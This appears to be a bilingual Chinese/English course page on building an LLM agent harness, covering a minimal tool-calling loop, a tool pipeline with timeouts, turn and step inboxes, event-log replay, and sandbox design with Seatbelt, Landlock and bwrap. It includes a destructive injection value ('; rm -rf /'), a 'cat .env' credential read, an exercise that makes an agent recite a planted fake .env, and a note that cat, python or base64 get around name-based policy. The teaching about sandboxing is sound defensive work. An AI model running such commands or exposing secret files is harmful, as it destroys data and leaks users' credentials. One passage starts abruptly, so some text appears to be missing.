已开讲Published

L0 – L4
L0

三句话Three sentences

无代码 · 五分钟no code · five minutes
第一句FIRST

LLM 是一个无状态的纯函数。你给它一段文本，它返回一段文本，仅此而已。它不记得你上次说了什么——所谓「对话」，是每次都把全部历史重新发过去造成的错觉。这一句决定了之后所有关于「状态存在哪里」的问题。

An LLM is a stateless pure function. Text in, text out, and nothing else. It does not remember what you said before — a "conversation" is an illusion produced by resending the entire history every single time. This sentence governs every later question about where state lives.

第二句SECOND

agent 是你在这个函数外面加的三样东西。一个循环（反复调用它，直到它说自己做完了）、一组工具（让它能影响外部世界）、一份状态（历史，以及历史之外的东西）。就这三样，没有第四样。之后你在任何框架里看到的一切，都是这三样在变复杂时长出来的秩序。

An agent is three things you wrap around that function. A loop (call it repeatedly until it says it is done), a set of tools (so it can affect the outside world), and state (the history, plus whatever else outlives a single call). Three, not four. Everything you will ever see in any framework is the order that grows on top of these three as they get complicated.

第三句THIRD

模型永远不能执行任何东西。它能做的只是在输出里说「我想调用 read_file，参数是 {"path": "package.json"}」——这叫 tool call，是一个意图，不是一次执行。真正的读文件发生在你的代码里，因为是你解析了这个意图并去调了 fs.readFile。

The model can never execute anything. All it can do is emit "I would like to call read_file with {"path": "package.json"}" — a tool call, which is an intent, not an execution. The actual file read happens in your code, because you are the one who parsed that intent and called fs.readFile.

第三句是整个领域的地基。你之后会遇到的所有问题——权限、沙箱、审批、审计、可重放——都是同一个问题的变体：执行发生在你这边，所以责任也在你这边。一个 harness 大半的代码，都在处理「模型提出意图」与「系统真的执行」之间那道缝。

The third sentence is the bedrock of the whole field. Every problem you will meet later — permission, sandboxing, approval, audit, replay — is a variant of one fact: execution happens on your side, so responsibility is yours too. Most of a harness's code lives in the gap between the model proposing an intent and the system actually performing it.

L1

三十行的最小 agentA thirty-line agent

可运行 · 零依赖runnable · zero deps
代码CODE

先跑通，再谈别的。这个仓库里已经有 DEEPSEEK_API_KEY，所以直接用 DeepSeek 的接口，Node 原生 fetch 就够，不装任何依赖。

Get it running before discussing anything else. The repo already carries a DEEPSEEK_API_KEY, so we call DeepSeek directly with Node's built-in fetch — no dependencies at all.

// agent.mjs —— node agent.mjs "读一下 package.json，这个项目叫什么"
import { readFile } from 'node:fs/promises'

const tools = [{
  type: 'function',
  function: {
    name: 'read_file',
    description: '读取一个文本文件的内容',
    parameters: {
      type: 'object',
      properties: { path: { type: 'string', description: '文件路径' } },
      required: ['path'],
    },
  },
}]

async function runTool(name, args) {
  if (name === 'read_file') return await readFile(args.path, 'utf8')
  return `unknown tool: ${name}`
}

const messages = [{ role: 'user', content: process.argv[2] ?? '这个目录里有什么？' }]

for (let step = 1; step <= 10; step++) {          // ← loop / 循环
  const res = await fetch('https://api.deepseek.com/chat/completions', {
    method: 'POST',
    headers: {
      'content-type': 'application/json',
      authorization: `Bearer ${process.env.DEEPSEEK_API_KEY}`,
    },
    body: JSON.stringify({ model: 'deepseek-chat', messages, tools }),
  })
  const message = (await res.json()).choices[0].message
  messages.push(message)                           // ← state / 状态

  if (!message.tool_calls?.length) {               // no intent = it is done
    console.log(message.content)
    break
  }

  for (const call of message.tool_calls) {         // ← tools / 工具
    console.log(`→ ${call.function.name}(${call.function.arguments})`)
    const result = await runTool(call.function.name, JSON.parse(call.function.arguments))
    messages.push({
      role: 'tool',
      tool_call_id: call.id,
      content: String(result).slice(0, 4000),
    })
  }
}

这就是一个 agent，没有省略任何本质部分。跑起来你会看到它先说「我要读 package.json」，你的代码读了并把内容塞回 messages，它再基于内容回答。三个箭头标注的位置，正是 L0 第二句里的循环、工具、状态。

That is an agent, with nothing essential omitted. Run it and you will watch it say "I want to read package.json", your code read the file and push the content back into messages, and the model answer from that content. The three arrows mark exactly the loop, the tools, and the state from L0's second sentence.

四颗种子FOUR SEEDS

现在看几处细节。它们眼下都无害，但每一处都是后面某一课的入口。

Now look at four details. All harmless today; each is the doorway to a later lesson.

for (let step = 1; step <= 10; step++)

这个 10 是你写下的第一条策略——你在替它决定「最多试十步」。dsh 里这一层叫 step：一次 step 就是「一次模型请求，加上它引发的工具执行」，而外面还包着一层 turn。为什么要分两层，L3 会让你自己撞上。

messages.push(message)

这是你的状态，而且现在是内存里的一个数组。进程一关就没了，也没法回看「第三步到底发过去什么」。L4 整堂课都在拆这一行。

String(result).slice(0, 4000)

你写下的第二条策略，而且是错的：被切掉的部分永远消失了，模型既拿不到也不知道它被截断过；按字节限流时还会切碎多字节字符。L6 讲工业做法——把超长结果溢出到文件，只给模型一个句柄。

if (name === 'read_file') ...

最值得盯住的一行。每加一个工具这个函数就长一点，而且执行、日志、超时、权限都会往里挤。L2 和 L8 都从这一行开始拆。

for (let step = 1; step <= 10; step++)

That 10 is the first policy you ever wrote — you decided on its behalf that ten attempts is enough. dsh calls this layer a step: one model request plus the tool executions it causes, with a turn wrapped around it. L3 will make you discover why two layers are needed.

messages.push(message)

This is your state, and right now it is an in-memory array. Close the process and it is gone; nor can you review what step three actually sent. L4 spends an entire lesson dismantling this one line.

String(result).slice(0, 4000)

Your second policy, and it is wrong: the truncated part is gone forever, the model neither receives it nor learns that truncation happened, and a byte-based limit would slice multi-byte characters in half. L6 covers the industrial answer — spill oversized results to a file and hand the model a handle.

if (name === 'read_file') ...

The line to watch. Every new tool lengthens this function, and execution, logging, timeouts, and permission all try to crowd into it. Both L2 and L8 start their work here.

练习EXERCISE

真的动手，十分钟。加一个 list_dir 工具，然后问它「这个项目的架构大概是怎样的」。观察两件事：它会连续调几次工具（这就是「多步」的由来），以及当你把 10 改成 2 时它会以什么姿态失败——那个失败的形态，就是 L3 的入口。

Actually do it, ten minutes. Add a list_dir tool, then ask it to describe the project's architecture. Watch two things: how many tool calls it chains (that is where "multi-step" comes from), and how it fails when you change 10 to 2. The shape of that failure is the doorway to L3.

L2

工具执行管线的雏形The pipeline, in embryo

l2-pipeline.mjs
疼痛PAIN

拿 L1 的代码试三件事：让工具睡 60 秒——整个 agent 陪着一起卡住，没有任何办法叫停；让工具读一个不存在的文件——异常一路冒到顶，进程直接死，之前跑的十步全白费；让模型一次提三个调用——你老老实实串行跑了三遍。三个问题的根子是同一个：runTool 那个函数里只有"执行"，没有"执行的规矩"。

Try three things with the L1 code. Make a tool sleep for sixty seconds — the whole agent hangs with it and nothing can stop it. Make a tool read a nonexistent file — the exception climbs to the top, the process dies, and the ten steps before it are wasted. Let the model request three calls at once — you dutifully run them one after another. All three share a root cause: runTool contains execution and nothing else. There are no rules around execution.

概念CONCEPT

把"执行一个工具"从一串 if 抽成一条固定的路：查表 → 守卫 → 带超时执行 → 观察。这条路就是「厨房门口的安检」，规矩挂在门上，厨房（工具本身）什么都不知道。

这一课只有一条规矩必须记住：工具失败要变成一条给模型的结果，而不是一个异常。因为模型读得到错误就能自己纠正——换个路径、换个工具、或者告诉你它做不到；而进程崩了，什么都没有了。

Lift "execute one tool" out of the if chain and into one fixed path: look up → guard → run with a timeout → observe. That path is the checkpoint at the kitchen door: rules hang on the door, and the kitchen — the tool itself — knows nothing about them.

One rule from this lesson is non-negotiable: a tool failure must become a result for the model, never an exception. A model that can read the error can correct itself — different path, different tool, or an honest "I can't." A dead process can do none of that.

代码CODE 
// 从这里往下，任何失败都必须变成一条"结果"，而不是异常
const controller = new AbortController()
const timer = setTimeout(() => controller.abort(new Error(`超过 ${TOOL_TIMEOUT_MS}ms 未返回`)), TOOL_TIMEOUT_MS)
try {
  // 光把 signal 传进去不够——工具可能根本不理它，所以还要 race 一个定时器
  const output = await Promise.race([
    definition.run(args, controller.signal),
    new Promise((_, fail) => controller.signal.addEventListener('abort',
      () => fail(controller.signal.reason), { once: true })),
  ])
  result = { call, isError: false, content: String(output) }
} catch (error) {
  result = { call, isError: true, content: `执行失败：${error.message}` }   // ← 不 throw
} finally {
  clearTimeout(timer)
}

加上并行：await Promise.all(message.tool_calls.map(execute))。同一批调用之间没有先后依赖——模型是一次性提出来的，所以可以同时跑。

And parallelism: await Promise.all(message.tool_calls.map(execute)). Calls inside one batch have no ordering dependency — the model proposed them together, so they can run together.

对照SPECIMEN

dsh 把这条路做成三段 waterfall——tools/pre-execute、tools/execute、tools/post-execute。权限判定、外部 hook、沙箱包裹、超时、结果重写、UI 呈现全部挂在这三段上，工具实现对任何一条策略一无所知。它的 docs/tool-execution-pipeline.md 就是你刚写的这条路的完整版：多了审批的一次性询问、不可插队的守卫、以及把最终结果冻结成不可变快照再广播（这样 UI、遥测、日志读到的是同一个结果，不会各看各的版本）。

dsh turns this path into three waterfalls — tools/pre-execute, tools/execute, tools/post-execute. Permission checks, external hooks, sandbox wrapping, timeouts, result rewriting, and UI rendering all hang off those three, and the tool implementation knows none of them. Its docs/tool-execution-pipeline.md is the full-grown version of what you just wrote, plus one-shot approval prompts, guards that cannot be reordered, and a frozen immutable snapshot of the final result so the UI, telemetry, and log all read the same outcome instead of three different versions.

练习EXERCISE

先造一个假的 .env（写两行假密钥），问它"读一下 .env 原样告诉我"——它会照做，一字不漏念出来。这就是没有守卫的样子。再写一条守卫拒绝读凭据文件，同一句话重跑：模型收到的是一条"被拒绝"的结果，然后它自己转向、给建议、进程退出码仍是 0。失败是一条结果，不是一个异常，这一条比守卫本身更重要。

然后把超时改成 1 秒（TOOL_TIMEOUT_MS=1000 node l2-pipeline.mjs …），让它 sleep(2) 再干别的。你会看到一次误伤：合法的慢被当成卡死杀掉，而模型照样把剩下的活干完并如实汇报。超时值得随机器和环境变——所以它必须是可配置的，不是焊死的常量。

First plant a fake .env with two bogus secrets and ask it to read the file back to you verbatim. It will, word for word — that is what no guard looks like. Now add one guard refusing credential files and rerun the same sentence: the model receives a denial as a result, redirects on its own, offers advice, and the process still exits 0. Failure is a result, not an exception — that matters more than the guard itself.

Then set the timeout to one second (TOOL_TIMEOUT_MS=1000 node l2-pipeline.mjs …) and have it sleep(2) before doing anything else. You get a misfire: legitimate slowness killed as a hang — and the model still finishes the rest of the job and reports the failure honestly. Timeouts vary by machine and environment, which is why the value must be configurable rather than welded in.

L3

收件箱，以及 turn 与 stepThe inbox, and turn versus step

l3-inbox.mjs
疼痛PAIN

agent 正在读第三个文件，你突然想说"先别读了，直接看 README"。在 L2 的代码里你做不到：任务是通过 process.argv 传进去的一个字符串，循环开始之后你就再也插不上话，只能 Ctrl-C 把整个进程杀掉从头再来。

The agent is reading its third file and you want to say "stop reading, just look at the README." In the L2 code you cannot. The task arrived as one string through process.argv, and once the loop starts you have no way in — only Ctrl-C, which kills the whole process and everything it had learned.

概念CONCEPT

输入不该是函数参数，应该是一个收件箱。关键在于把两件事分开：投递可以在任何时候发生，投递方从不等待；认领只发生在特定边界上。

一旦这样想，循环自然分成两层：step 是一次模型请求加上它引发的工具执行；turn 是"排空一次输入"——从认领第一条消息开始，到没事可做为止，中间可以有好几个 step。插话在 step 边界被接住：不打断正在跑的工具，但下一步就生效。这就是一顿饭和一道菜。

Input should not be a function argument; it should be an inbox. The move is to separate two things: delivery can happen at any moment and never blocks the sender, while claiming happens only at defined boundaries.

Think that way and the loop splits into two layers on its own. A step is one model request plus the tools it causes. A turn is one drain of the input — from claiming the first message until there is nothing left to do, possibly several steps later. An interjection is caught at a step boundary: it does not interrupt the running tool, but it takes effect on the very next step. A meal and a dish.

代码CODE 
/** 有就立刻拿走全部；没有就等到有为止。turn 开始时用这个。 */
async claimBlocking() {
  if (this.#queue.length === 0) await new Promise((wake) => { this.#waiting = wake })
  return this.claimPending()
}

/** 有就拿走，没有就返回空——step 之间用这个，不能在这里卡住。 */
claimPending() { return this.#queue.splice(0, this.#queue.length) }

// ...每个 step 结束时：
const injected = inbox.claimPending()          // ← 插话唯一被接住的地方
if (injected.length > 0) { messages.push(...injected); continue }
if (!message.tool_calls?.length) break         // 没话说也没插话 → turn 结束

中断也是同一件事的另一面：Ctrl-C 只 abort 当前 turn 的 controller，进程活着；而这个 signal 要一路传到正在跑的工具里去——取消必须向下传递，否则你"停"了 turn，工具还在后台跑。

Cancellation is the same idea from the other side: Ctrl-C aborts only the current turn's controller and the process stays alive — and that signal must be relayed all the way down into the running tool. Cancellation propagates downward, or you "stop" the turn while the tool keeps running behind your back.

概念CONCEPT

把这行字读三遍：messages 数组不是状态，它是从日志算出来的一个临时值。

唯一真相源是一个只能追加、不能改写的事件日志（一行一个 JSON）。模型历史由一个纯函数 deriveMessages(events) 投影出来——同样的日志永远得到同样的历史。配套一条规矩：模型可见 ⟺ 已记录。凡是模型看得见的东西，日志里都必须有对应事件；反过来，没进日志的东西不可能出现在请求里。连 system prompt 都是一个事件。

Read this line three times: the messages array is not state; it is a temporary value computed from the log.

The single source of truth is an append-only event log, one JSON object per line. Model history is projected by a pure function, deriveMessages(events) — the same log always yields the same history. It comes with one rule: model-visible ⟺ logged. Anything the model can see must have a corresponding event; anything absent from the log cannot appear in a request. Even the system prompt is an event.

事件从哪来？

不是另开一本账，而是循环里每发生一件事就 append 一行：你说话掉一行、模型回话掉一行、工具跑完掉一行。顺序上有一条硬规矩——先执行、后记录，日志里只能有真的发生过的事，否则重放会重建出一个从未存在过的世界。

存在哪？换成数据库呢？

这一课是 JSONL 文件，一行一个事件。换成 SQLite 只是换掉 append 的那一句实现，deriveMessages() 一个字都不用改——因为投影只依赖"事件序列"这个概念，不依赖它躺在哪。这正是 dsh 能同时提供 JSONL 和 SQLite 两种持久化后端、还能在上面加投影缓存和全文检索的原因。

还原是"恢复状态"吗？

不是。它不保存也不恢复任何状态，它重放：读日志 → 投影 → 得到与断电前逐字相同的历史。所以「续跑」和「分叉」是同一件事的两种参数——读全部，还是只读前 6 行。

Where do events come from?

Not from a second set of books. Every time something happens in the loop, one line is appended: you speak, one line; the model replies, one line; a tool finishes, one line. One hard ordering rule — execute first, log after. Only things that really happened may enter the log, or a replay will rebuild a world that never existed.

Where is it stored — what about a database?

This lesson uses JSONL, one event per line. Switching to SQLite replaces exactly one line, the append call; deriveMessages() does not change by a single character, because projection depends on the idea of an event sequence and not on where it lies. That is why dsh can ship JSONL and SQLite backends side by side and add a projection cache and full-text search on top.

Is restoring the same as "recovering state"?

No. Nothing saves or restores state; it replays: read the log, project, and obtain a history identical to the one before the cut, word for word. Which makes resume and fork the same operation with different arguments — read everything, or read only the first six lines.

// 整课的核心：纯函数，同样的日志永远得到同样的历史
function deriveMessages(events) {
  const messages = []
  const answered = new Set(events.filter((e) => e.type === 'tool/result').map((e) => e.callId))
  for (const event of events) {
    switch (event.type) {
      case 'system/prompt':     messages.push({ role: 'system', content: event.content }); break
      case 'user/message':      messages.push({ role: 'user', content: event.content }); break
      case 'tool/result':       messages.push({ role: 'tool', tool_call_id: event.callId, content: event.content }); break
      case 'assistant/message':
        messages.push(event.message)
        // 日志可能停在"已经说要调工具、结果还没写下来"的地方：Ctrl-C、断电、
        // 或分叉边界正好落在这一步中间。API 规定每个 tool_call_id 都必须有回应，
        // 少一条，整份历史就是废的。
        for (const call of event.message.tool_calls ?? []) {
          if (!answered.has(call.id)) {
            messages.push({ role: 'tool', tool_call_id: call.id, content: '(工具没有返回结果：会话在这一步中断了)' })
          }
        }
        break
      default: break  // turn/start、tool/call 只用于回看，不进模型历史
    }
  }
  return messages
}

Note where the repair lives: in the projection, not in the log. The log records what happened and is allowed to be ragged; the projection turns ragged facts into a history the API will accept. Keeping those two jobs apart is what lets the log stay append-only forever.

They hang off the stages of L2's fixed pipeline, and tool implementations know nothing about them. The last beat of this lesson is about exactly that.

概念CONCEPT

三道防线，位置不同，信任假设一级比一级低。判定是执行前的纯函数：看得懂的坏事直接拒绝，看不懂的标成"要问"；它可以被单测、被写进日志、被原样念给人听。审批把判不了的交给人：一次一授，批准只对这一次这个动作有效；没人能回答就拒绝——沉默绝不等于同意。围栏不需要看懂任何命令：把你本来就要 spawn 的那串 argv 原样包一层交给内核（macOS 是 seatbelt，Linux 是 landlock 或 bwrap），被拦下来之后拿回的是一条带着"我在哪种模式下跑"的结果，不是一个异常。

Three lines of defense, each trusting less than the one before it. Policy is a pure function that runs before execution: refuse what it understands to be bad, mark the rest as "ask." It can be unit-tested, logged, and read aloud to a human verbatim. Approval hands the undecidable to a person: one grant, one action, and no answerer means refusal — silence is never consent. The fence understands nothing: hand the kernel the exact argv you were about to spawn (seatbelt on macOS, landlock or bwrap on Linux) and what comes back from a block is a result carrying the mode it ran under, not an exception.

一句话记住它们的分工：判定挡的是名字，围栏挡的是效果。只有在真正产生效果的那个操作里做的检查，才拦得住 cat、python、base64 这些你想不全的绕法。前两道不是没用——它们让 90% 的情况根本走不到内核那一步，而且它们能给出人看得懂的理由；但把安全性建在它们身上，就是把安全性建在"我能穷举所有写法"这个假设上。

One sentence to keep: policy blocks names, the fence blocks effects. Only a check inside the operation that actually produces the effect can stop cat, python, base64, and the rewrites you will never finish enumerating. The first two are not useless — they keep ninety percent of cases from ever reaching the kernel, and they can state a reason a human understands — but resting your security on them means resting it on "I can enumerate every spelling."

进程 · spawn · argvPROCESS · SPAWN · ARGV

下一节全是进程的词，先花两分钟把它们讲清楚——harness 说到底就是一个"替模型开进程"的程序，进程模型就是它的物理学。

The next section is all process vocabulary, so two minutes on it first — a harness is, at bottom, a program that starts processes on a model's behalf, and the process model is its physics.

进程是操作系统正在运行的一个程序实例，有自己的内存、自己的当前目录、自己的环境变量、自己的权限。spawn（也写作 fork+exec）是"我这个进程去启动另一个程序"。子进程会继承父进程的一堆东西：当前目录、环境变量、打开的输入输出通道，以及施加在父进程上的沙箱限制——最后这条是围栏能自动覆盖"孙子进程"的原因：你不需要预测 bash 会不会再去启动 python。

A process is one running instance of a program, with its own memory, working directory, environment variables, and permissions. Spawn (or fork+exec) means "this process starts another program." The child inherits a pile of things from the parent: working directory, environment, open input/output channels — and any sandbox restrictions on the parent. That last one is why a fence automatically covers grandchildren: you never have to predict whether bash will go on to start python.

argv 是程序启动时拿到的参数数组，第 0 个是程序名。['bash', '-c', 'cat .env'] 的意思是：启动 bash，把 -c 和后面那段脚本文本交给它。为什么必须是数组、不能是一整根字符串？因为字符串要先被 shell 解析一遍，;、|、&&、$(...)、空格都会被重新解释——命令注入就是从这道解析里来的。数组是直接交给内核的 execve，中间没有第二次解释，参数里就算带着 ; rm -rf / 也只是一个普通的字符串参数。（bash -c 是明确请求解析一次，那是有意为之，也正因如此它才需要被围起来。）

argv is the array of arguments a program receives at startup, with element zero being the program name. ['bash', '-c', 'cat .env'] means: start bash and hand it -c plus that script text. Why must it be an array rather than one string? Because a string gets parsed by a shell first, and ;, |, &&, $(...), and spaces are all reinterpreted — command injection lives in that parse. An array goes straight to the kernel's execve with no second interpretation, so an argument containing ; rm -rf / is just an ordinary string. (bash -c explicitly requests one parse, deliberately — which is exactly why it needs a fence around it.)

于是"包一层 argv"就有了确切含义：把 ['bash','-c',cmd] 换成 ['sandbox-exec','-p',profile,'bash','-c',cmd]。sandbox-exec 是一个真实存在的小程序，它做两件事：先向内核申请"给我自己套上这份规则"，然后把自己变成 bash（exec：同一个进程被目标程序替换，限制留在原地）。所以 bash 从它的第一条指令起就已经在圈里，中间没有"先跑一下、稍后再上锁"的窗口。Linux 上的 bwrap 和 landlock 启动器是同一个套路。

Which gives "wrapping the argv" a precise meaning: ['bash','-c',cmd] becomes ['sandbox-exec','-p',profile,'bash','-c',cmd]. sandbox-exec is a real small program that does two things: ask the kernel to apply this profile to itself, then become bash (exec replaces the process image with the target program while the restrictions stay in place). So bash is inside the fence from its first instruction, with no "run briefly, lock later" window. bwrap and the landlock launchers on Linux work the same way.

还有三个词值得单独一节，因为它们合起来就是 harness 判断"刚才到底发生了什么"的全部依据。

Three more words deserve their own section, because together they are everything a harness has for judging what just happened.

进程只会回你四样东西A PROCESS ANSWERS IN FOUR THINGS

agent 每跑一条命令，拿回来的东西其实只有四样：正常输出、错误输出、退出码，以及（万一它是被杀死的）信号。你的代码对"刚才发生了什么"的全部认知都来自这四样。特别要注意："沙箱拒绝了它"没有专属通道——它就混在这四样里面，这是后面所有麻烦的根源。

Every command the agent runs comes back as only four things: normal output, error output, an exit code, and — if it was killed — a signal. Everything your code knows about what happened comes from those four. And note: "the sandbox refused it" has no channel of its own; it is mixed in with the four. That is the root of every difficulty below.

① 退出码（exit code）是进程结束时留给启动它的人的一个数字，0 表示成功，非 0 表示失败。坑在于：一串命令的退出码，是最后一条命令的退出码。亲手跑一遍就懂了：

① The exit code is one number a process leaves to whoever started it: 0 means success, anything else means failure. The trap: the exit code of a sequence is the exit code of its last command. Run it yourself:

$ bash -c 'rm /nonexistent-file; ls /tmp > /dev/null'; echo $?
rm: /nonexistent-file: No such file or directory
0     # ← 前面明明失败了，整条命令仍然算成功

$ bash -c 'rm /nonexistent-file && ls /tmp > /dev/null'; echo $?
rm: /nonexistent-file: No such file or directory
1     # ← 换成 && 就短路了，失败才传得出来

这正是我们那次升级重试没触发的原因：升级的条件是"命令失败并且看起来像被拒绝"，而模型写的是 rmdir X 2>&1; ls -la X——最后那条 ls 成功了，整条命令的退出码于是是 0，我们的代码判定"没失败"，问都没问就往下走了。你的判断挂在退出码上，而退出码可以被一个分号改写。

That is exactly why one escalation never fired: escalation requires "the command failed and it looks like a denial," but the model wrote rmdir X 2>&1; ls -la X — the trailing ls succeeded, so the whole command exited 0, our code concluded "nothing failed," and moved on without asking. Your logic hangs on the exit code, and a semicolon rewrites the exit code.

② 两条输出通道：每个进程一出生就带三根管子——stdin（0 号，别人喂给它的输入）、stdout（1 号，正常输出）、stderr（2 号，错误信息）。后两根是分开的，所以你可以只留一根、丢掉另一根：

② Two output channels: every process is born with three pipes — stdin (0, what others feed it), stdout (1, normal output), stderr (2, error messages). The last two are separate, so you can keep one and discard the other:

$ bash -c 'ls /tmp/nope' 1>/dev/null      # 丢掉正常输出，只留错误
ls: /tmp/nope: No such file or directory

$ bash -c 'ls /tmp/nope' 2>/dev/null      # 丢掉错误，只留正常输出
                                          # （什么都没有）

$ bash -c 'ls /tmp/nope 2>&1' 2>/dev/null # 命令自己先把 2 号并进了 1 号
ls: /tmp/nope: No such file or directory  # ← 错误信息躲过了 2>/dev/null

2>&1 的意思是"把 2 号管子接到 1 号现在指的地方"，也就是把错误信息塞进正常输出里。模型极爱这么写，因为它想一次看全所有输出。后果是：一个只在 stderr 里找 Operation not permitted 的分类器，什么也找不到——错误还在，只是换了条管子。所以我们把分类器改成读"两条合流之后的全文"。

2>&1 means "point pipe 2 at wherever pipe 1 currently goes" — that is, stuff the errors into the normal output. Models love writing it, because they want to see everything at once. The consequence: a classifier that looks for Operation not permitted in stderr alone finds nothing — the error is still there, just in the other pipe. Which is why ours now reads the merged text of both.

③ 信号（signal）是操作系统送给进程的一张通知单。最常见两张：SIGTERM（15 号，"请你退出"，进程可以先收尾）和 SIGKILL（9 号，"立刻死"，进程无法拦截）。超时就是这么实现的：等够 N 毫秒还不结束，就给它——以及它派生出来的整棵进程树（所以叫"进程组"）——发一张。被信号杀掉的进程，退出码是 128 + 信号号：

③ A signal is a notice the operating system delivers to a process. Two matter: SIGTERM (15, "please exit," which the process may handle) and SIGKILL (9, "die now," which it cannot intercept). That is how a timeout is implemented: wait N milliseconds, then send one to the process — and to the whole tree it spawned, which is why it goes to the process group. A process killed by a signal exits with 128 + signal number:

$ bash -c 'sleep 30' &  kill -TERM $!
143     # = 128 + 15，被 SIGTERM 杀的；137 = 128 + 9，被强杀（也常见于内存超限）

④ errno 是系统调用失败时内核给出的错误编号，每个编号配一句固定的英文。沙箱拒绝你的时候，你收到的就是它——不同后端说不同的方言，这就是我们那条 DENIAL 正则要认的东西：

④ errno is the numeric error the kernel returns when a system call fails, each with a fixed English sentence. It is what a sandbox denial arrives as — different backends speak different dialects, and those dialects are what our DENIAL regex has to recognize:

EPERM   = errno  1  →  "Operation not permitted"   # macOS Seatbelt 拒绝写入
EACCES  = errno 13  →  "Permission denied"         # Linux Landlock 拒绝；也可能只是文件权限位
EROFS   = errno 30  →  "Read-only file system"     # bwrap 把目录只读挂载

$ sandbox-exec -p '(version 1)(allow default)(deny file-write*)' bash -c 'echo x > /tmp/f'
bash: line 1: /tmp/f: Operation not permitted      # ← 这一行就是 EPERM 的人话版本

现在那句"拒绝没有专属通道"就具体了：沙箱拦下一次写入，你拿到的全部信息是一句混在 stderr 里的英文 + 一个非 0 退出码。这解释了之前一带而过的两件事——为什么需要一条认方言的正则（三种后端说三种话，而 Permission denied 还可能只是普通的文件权限问题，根本不是沙箱），以及为什么正确做法是让沙箱层把 denied / mode / enforcement 作为结构化事实另外报一份：猜文字永远只是启发式，报事实才是确定的。

Now "a denial has no channel of its own" is concrete: when the sandbox blocks a write, all you get is one English sentence buried in stderr plus a non-zero exit code. Which explains two things skipped over earlier — why a dialect-recognizing regex is needed at all (three backends, three phrasings, and Permission denied may just be an ordinary file-mode problem rather than the sandbox), and why the right design is to have the sandbox layer report denied / mode / enforcement separately as structured facts: guessing from text is forever a heuristic, reporting facts is not.

沙箱是什么WHAT A SANDBOX IS

一句话：沙箱是一组由内核强制执行、进程自己解不掉、并且会被它派生的所有子进程继承的限制。三个词都是要点。内核强制——不需要被限制的程序配合，它想不想守规矩都一样；解不掉——限制是单向的，加上之后进程无法给自己放宽；被继承——所以 bash -c "python x.py" 里那个 python 也跑不出来，你不需要枚举它会不会再 spawn 别的东西。

In one sentence: a sandbox is a set of restrictions enforced by the kernel, which the process cannot lift, and which every process it spawns inherits. All three clauses matter. Kernel-enforced — it does not need the restricted program's cooperation, and works whether or not that program intends to behave. Cannot be lifted — confinement is one-way; once applied a process cannot widen it. Inherited — so the python inside bash -c "python x.py" is confined too, and you never have to enumerate what it might spawn next.

照这个定义，很多被叫做"沙箱"的东西不是沙箱：在 system prompt 里写"请不要删除文件"不是（那是请求）；你自己在 execute() 里的 if 不是（那是判定，同一个进程里的代码，换个工具就绕开了）；Node 的 vm 模块也不是（同进程，早有成熟的逃逸手法）。判断标准只有一条：拦截发生在你的进程之外吗？

By that definition, plenty of things called sandboxes are not sandboxes: "please do not delete files" in a system prompt is a request; an if inside your own execute() is policy — same process, routed around by the next tool; Node's vm module is not one either (same process, with well-known escapes). There is a single test: does the interception happen outside your process?

真正在用的机制，按"隔离多深"排：同一台机器的内核机制——Linux 的 Landlock（不需要 root 的路径级文件权限）、seccomp-bpf（按系统调用过滤）、namespaces + bubblewrap（bwrap，重建一套挂载视图）；macOS 的 Seatbelt（sandbox-exec 加一份 SBPL 规则文件，就是这一课用的）；Windows 的受限令牌 + ACL。再往上是容器（Docker：共享内核，是很好用的边界，但内核漏洞面仍在，业界一般不把它当作对抗恶意代码的安全边界）；再往上是微虚拟机与用户态内核（Firecracker、Kata、gVisor）；最外面是换一台机器——远程执行环境，例如 E2B 这类给 agent 用的远端沙箱，dsh 的 packages/e2b 就是这条路的验证。

The mechanisms actually in use, ordered by depth of isolation: kernel facilities on the same machine — Linux Landlock (unprivileged, path-scoped file permissions), seccomp-bpf (syscall filtering), namespaces plus bubblewrap (bwrap, a rebuilt mount view); macOS Seatbelt (sandbox-exec with an SBPL profile, what this lesson uses); Windows restricted tokens plus ACLs. Above that, containers (Docker shares the kernel — a useful boundary, but the kernel attack surface remains, and the industry does not treat it as a security boundary against hostile code). Above that, microVMs and userspace kernels (Firecracker, Kata, gVisor). Outermost, another machine entirely — remote execution environments such as E2B's agent sandboxes; dsh's packages/e2b is its proof of that path.

用起来长什么样？就一个函数：把你本来要 spawn 的 argv 交出去，拿回另一串 argv，然后 spawn 拿回来的那串。dsh 的接口原文是 ctx.sandbox.confine(argv, policy)，注释写得很直白——returns the argv to spawn instead of your own。这一课里就是 ['bash','-c',cmd] 变成 ['sandbox-exec','-p',profile,'bash','-c',cmd]。注意交出去的必须是你本来要执行的那串原文，不是你重新拼过的字符串——一旦重拼，人批准的和实际执行的就可能不是同一条命令。

What does using one look like? One function: hand over the argv you were about to spawn, get a different argv back, and spawn that one. dsh's contract says it plainly — ctx.sandbox.confine(argv, policy) returns the argv to spawn instead of your own. Here that turns ['bash','-c',cmd] into ['sandbox-exec','-p',profile,'bash','-c',cmd]. And what you hand over must be the exact argv you were going to run, never a restringified version — the moment you re-assemble it, what the human approved and what actually executes can differ.

沙箱体现在四个地方，缺一个就漏：① spawn 的那一刻（包 argv）；② 模式的选择（会话默认一档，每次调用可以带自己的一档——dsh 的说法是 policy rides the call，两个消费者可以在同一瞬间用不同模式）；③ 结果里（跑完要带回 denied、mode、enforcement 三个事实，模型和 UI 读到的是事实而不是猜测）；④ 不止 bash——文件工具、LSP、子进程、子 agent 全都要用同一个工作区根，否则 write_file 就成了 bash 的后门。dsh 里 dsh-fs-sandbox 与 dsh-bash-sandbox 共用一个 ctx.sandboxPolicy，就是为了让两家永远不会围到不同的圈里。

A sandbox shows up in four places, and missing one leaks: ① at spawn time (wrapping argv); ② in mode selection (a session default, overridable per call — dsh's phrasing is that policy rides the call, so two consumers can confine differently at the same instant); ③ in the result (a finished run carries denied, mode, and enforcement back as facts, so the model and the UI read facts instead of guessing); ④ beyond bash — file tools, LSP, subprocesses, and subagents must share the same workspace root, or write_file becomes bash's back door. In dsh, dsh-fs-sandbox and dsh-bash-sandbox consume one ctx.sandboxPolicy precisely so the two families can never fence different circles.

